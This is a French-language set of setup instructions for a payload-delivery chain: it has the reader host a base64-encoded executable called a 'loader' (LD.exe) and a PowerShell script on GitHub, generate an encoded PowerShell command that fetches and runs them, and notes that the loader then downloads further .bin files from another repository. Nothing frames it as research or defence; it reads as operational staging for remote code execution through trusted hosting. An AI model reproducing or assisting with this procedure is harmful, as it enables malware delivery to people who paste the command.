═══════════════════════════════════════════════════════════════
  ÉTAPES POUR METTRE EN PLACE TON REPO GITHUB
═══════════════════════════════════════════════════════════════

ÉTAPE 1: CRÉER TON REPO GITHUB
──────────────────────────────
1. Va sur GitHub.com
2. Clique sur "New repository" (ou "+" > "New repository")
3. Donne un nom à ton repo (ex: "mon-loader")
4. Choisis Public ou Private (comme tu veux)
5. NE coche PAS "Add a README file" (on va upload les fichiers après)
6. Clique sur "Create repository"

ÉTAPE 2: MODIFIER script.ps1
──────────────────────────────
1. Ouvre: moi/script.ps1
2. Va à la ligne 45
3. Remplace TON_USERNAME et TON_REPO par tes vraies valeurs:

   Exemple si ton repo est: github.com/john/mon-loader
   Alors ligne 45 devient:
   $url = "https://raw.githubusercontent.com/john/mon-loader/refs/heads/main/file.txt"

4. Sauvegarde le fichier

ÉTAPE 3: MODIFIER commande.txt
───────────────────────────────
1. Ouvre PowerShell dans le dossier: moi/
2. Exécute le script encode_commande.ps1 avec TON URL:

   .\encode_commande.ps1 -Url "https://raw.githubusercontent.com/TON_USERNAME/TON_REPO/refs/heads/main/script.ps1"

   Exemple:
   .\encode_commande.ps1 -Url "https://raw.githubusercontent.com/john/mon-loader/refs/heads/main/script.ps1"

3. Le script va créer/mettre à jour commande.txt automatiquement

ÉTAPE 4: UPLOAD LES FICHIERS SUR GITHUB
─────────────────────────────────────────
1. Va sur la page de ton repo GitHub
2. Clique sur "uploading an existing file" (ou "Add file" > "Upload files")
3. Upload ces 2 fichiers:
   - file.txt (LD.exe encodé en base64)
   - script.ps1 (celui que tu as modifié)
4. Clique sur "Commit changes" en bas

ÉTAPE 5: TESTER
────────────────
1. Ouvre PowerShell
2. Copie-colle le contenu de commande.txt
3. Appuie sur Entrée
4. Le loader LD.exe devrait se lancer

═══════════════════════════════════════════════════════════════

RÉSUMÉ DES FICHIERS À UPLOAD:
──────────────────────────────
✓ file.txt        → Sur GitHub (dans le repo, pas dans une release)
✓ script.ps1      → Sur GitHub (dans le repo, pas dans une release)
✗ commande.txt    → PAS besoin de l'uploader (c'est juste pour toi)
✗ Les .bin        → On s'en occupe après

═══════════════════════════════════════════════════════════════

NOTE: Pour l'instant, LD.exe va essayer de télécharger les .bin depuis
"forensics-honor/exe". On modifiera LD.exe après pour qu'il utilise
ton repo pour les .bin.

═══════════════════════════════════════════════════════════════

